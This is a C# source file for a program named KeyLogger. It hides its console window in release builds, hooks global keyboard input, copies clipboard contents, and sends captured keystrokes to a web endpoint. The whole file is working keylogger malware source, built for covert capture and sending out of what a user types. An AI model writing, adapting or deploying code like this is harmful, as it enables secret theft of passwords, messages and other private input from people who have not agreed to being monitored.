using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        private const string CONNECT = "https://localhost:44388/kl/c";
        private const string SEND = "https://localhost:44388/kl/l";

        [STAThread]
        public static void Main()
        { 
            var handle = GetConsoleWindow();
#if DEBUG
            ShowWindow(handle, SW_SHOW);  // to show the running application
#else
            ShowWindow(handle, SW_HIDE);  // to hide the running application
#endif
            using var keyboard = new KeyboardHook();
            var analyzer = new KeyboardAnalyzer();
            using var server = new WebHook();
            server.Connect(CONNECT).GetAwaiter().GetResult();

            analyzer.OnPress += (codes, keys) =>
            {
                analyzer.CopyClipboard(keys);
                #if DEBUG
                Console.WriteLine($"{keys.Last().From.ToLongTimeString()} {keys.Last().To.ToLongTimeString()}: {string.Join(" + ", keys.Select(k => $"{k.Key} ({DateTime.UtcNow-k.From})"))}");
                if (keys.Last().DataType.HasValue && keys.Last().Data != null)
                {
                    var text = keys.Last().Data.ToString();
                    if (text != null)
                    {
                        if (text.Length > 80)
                            Console.WriteLine(text.Substring(0, 80));
                        else
                            Console.WriteLine(text);
                    }
                }
                #endif
                server.SendKeys(SEND, keys);
            };

            keyboard.KeyDown += (i, k) => { analyzer.KeyDown(i, k); };
            keyboard.KeyUp += (i, k) => { analyzer.KeyUp(i, k); };

            Application.Run();
        }


        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
